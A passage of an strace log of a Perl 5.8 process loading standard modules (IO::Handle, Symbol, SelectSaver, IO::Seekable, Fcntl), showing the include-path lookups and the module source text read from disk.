or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
5498  07:09:19.809369 stat64("/etc/perl/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809390 stat64("/etc/perl/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809403 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809416 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809429 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809442 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809455 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809467 stat64("/usr/lib/perl5/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809480 stat64("/usr/share/perl5/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809492 stat64("/usr/share/perl5/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809505 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809517 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809530 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.809542 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
5498  07:09:19.809563 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.809566 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.809579 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.809615 read(11, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
5498  07:09:19.810105 read(11, "", 4096) = 0
5498  07:09:19.810122 close(11)         = 0
5498  07:09:19.810185 stat64("/etc/perl/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810202 stat64("/etc/perl/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810216 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810229 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810243 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810256 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810270 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810281 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810295 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810307 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810320 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810333 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810347 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.810359 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
5498  07:09:19.810380 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.810395 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.810406 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.810434 read(11, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
5498  07:09:19.810606 brk(0x81d6000)    = 0x81d6000
5498  07:09:19.810636 read(11, "", 4096) = 0
5498  07:09:19.810648 close(11)         = 0
5498  07:09:19.811117 read(10,  <unfinished ...>
5496  07:09:19.811136 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
5498  07:09:19.811146 <... read resumed> "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
5496  07:09:19.811375 <... rt_sigprocmask resumed> NULL, 8) = 0
5498  07:09:19.811802 read(10,  <unfinished ...>
5496  07:09:19.811823 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5496  07:09:19.811839 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5496  07:09:19.811850 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5496  07:09:19.811862 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5496  07:09:19.811876 waitpid(-1,  <unfinished ...>
5498  07:09:19.811886 <... read resumed> "", 4096) = 0
5498  07:09:19.811894 close(10)         = 0
5498  07:09:19.811928 stat64("/etc/perl/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812451 stat64("/etc/perl/IO/Seekable.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812664 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812761 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812814 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812847 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812874 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812896 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812912 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812924 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812937 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.812953 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
5498  07:09:19.812975 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.812990 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.813001 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.813020 read(10, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
5498  07:09:19.813147 stat64("/etc/perl/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813201 stat64("/etc/perl/Fcntl.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813216 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813245 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813258 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813271 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813284 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813296 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813308 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813320 stat64("/usr/share/perl5/Fcntl.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813333 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.813345 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
5498  07:09:19.813365 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.813379 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.813390 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.813409 read(11, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
5498  07:09:19.813796 brk(0x81f7000)    = 0x81f7000
5498  07:09:19.813974 read(11, "", 4096) = 0
5498  07:09:19.813988 close(11)         = 0
5498  07:09:19.814057 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5498  07:09:19.814082 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5498  07:09:19.814108 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 11
5498  07:09:19.814122 read(11, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
5498  07:09:19.814269 fstat64(11, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
5498  07:09:19.814289 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 11, 0) = 0xb7d88000
5498  07:09:19.814302 mmap2(0xb7d8b000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 11, 0x2) = 0xb7d8b000
5498  07:09:19.814317 close(11)         = 0
5498  07:09:19.814519 read(10, "", 4096) = 0
5498  07:09:19.814534 close(10)         = 0
5498  07:09:19.814566 stat64("/etc/perl/IO/File.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
